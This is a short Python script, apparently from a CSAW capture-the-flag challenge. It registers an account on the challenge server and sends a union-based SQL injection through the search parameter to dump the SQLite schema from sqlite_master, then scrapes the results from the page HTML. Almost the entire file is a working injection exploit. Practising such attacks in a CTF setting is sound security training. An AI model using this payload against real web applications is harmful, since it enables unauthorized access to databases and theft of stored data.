import requests, re, html
base='http://csale.chal.csaw.io:5000'
s=requests.Session()
s.post(base+'/signup', data={'username':'probe7','password':'A'*32})
def q(payload):
    r = s.get(base+'/', params={'q': payload})
    if 'Search failed' in r.text:
        return None, 'ERR'
    # parse cards: img, small, h3, p
    cards = re.findall(r'<article class="card">(.*?)</article>', r.text, re.S)
    out=[]
    for c in cards:
        t = re.search(r'<h3>(.*?)</h3>', c, re.S)
        d = re.search(r'<p>(.*?)</p>', c, re.S)
        sm = re.search(r'<small>(.*?)</small>', c, re.S)
        out.append((html.unescape(sm.group(1)) if sm else '', html.unescape(t.group(1)) if t else '', html.unescape(d.group(1)) if d else ''))
    return out, 'OK'
res,_ = q("') UNION SELECT 1,name,sql,4,5,6,7 FROM sqlite_master--")
for r in res or []:
    print(r)
EOF
